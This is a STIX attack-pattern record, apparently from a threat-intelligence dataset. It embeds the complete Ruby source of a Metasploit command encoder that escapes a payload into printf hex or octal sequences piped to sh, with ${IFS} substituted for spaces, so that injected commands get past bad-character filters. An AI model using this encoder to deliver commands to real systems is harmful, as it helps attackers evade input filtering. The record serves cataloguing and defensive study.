{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ea87d4fa-bfe3-491d-9bbb-d4b7df07eb71",
    "created": "2024-08-14T16:33:19.232245Z",
    "modified": "2024-08-14T16:33:19.232253Z",
    "name": "printf(1) via PHP magic_quotes Utility Command Encoder",
    "description": " This encoder uses the printf(1) utility to avoid restricted characters. Some shell variable substitution may also be used if needed symbols are blacklisted. Some characters are intentionally left unescaped since it is assumed that PHP with magic_quotes_gpc enabled will escape them during request handling. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/encoders/cmd/printf_php_mq.rb",
            "external_id": "printf_php_mq.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Encoder\n\n  # Has some issues, but overall it's pretty good\n  # - printf(1) may not be available\n  # - requires: \"\\x7c\\x73\\x68\\x5c\\x78\"\n  # - doesn't work on windows\n  # - min size increase: 4x + 9\n  # - max size increase: 4x + 14\n  # However, because it intentionally leaves backslashes unescaped (assuming\n  # that PHP's magic_quotes_gpc will take care of escaping them) it is\n  # unsuitable for most exploits.\n  Rank = ManualRanking\n\n  def initialize\n    super(\n      'Name'             => 'printf(1) via PHP magic_quotes Utility Command Encoder',\n      'Description'      => %q{\n          This encoder uses the printf(1) utility to avoid restricted\n        characters. Some shell variable substitution may also be used\n        if needed symbols are blacklisted. Some characters are intentionally\n        left unescaped since it is assumed that PHP with magic_quotes_gpc\n        enabled will escape them during request handling.\n      },\n      'Author'           => 'jduck',\n      'Arch'             => ARCH_CMD,\n      'Platform'         => 'unix',\n      'EncoderType'      => Msf::Encoder::Type::PrintfPHPMagicQuotes)\n  end\n\n\n  #\n  # Encodes the payload\n  #\n  def encode_block(state, buf)\n\n    # Skip encoding for empty badchars\n    if(state.badchars.length == 0)\n      return buf\n    end\n\n    # If backslash is bad, we are screwed.\n    if (state.badchars.include?(\"\\\\\")) or\n      (state.badchars.include?(\"|\")) or\n      # We must have at least ONE of these two..\n      (state.badchars.include?(\"x\") and state.badchars.include?(\"0\"))\n      raise EncodingError\n    end\n\n    # Now we build a string of the original payload with bad characters\n    # into \\0<NNN> or \\x<HH>\n    if (state.badchars.include?('x'))\n      hex = buf.unpack('C*').collect { |c| \"\\\\0%o\" % c }.join\n    else\n      hex = buf.unpack('C*').collect { |c| \"\\\\x%x\" % c }.join\n    end\n\n    # Build the final output\n    ret = \"printf\"\n\n    # Special case: <SPACE>, try to use ${IFS}\n    if (state.badchars.include?(\" \"))\n      ret << '${IFS}'\n    else\n      ret << \" \"\n    end\n\n    ret << hex << \"|sh\"\n\n    return ret\n  end\nend\n",
    "x_mitre_platforms": [
        "unix'"
    ]
}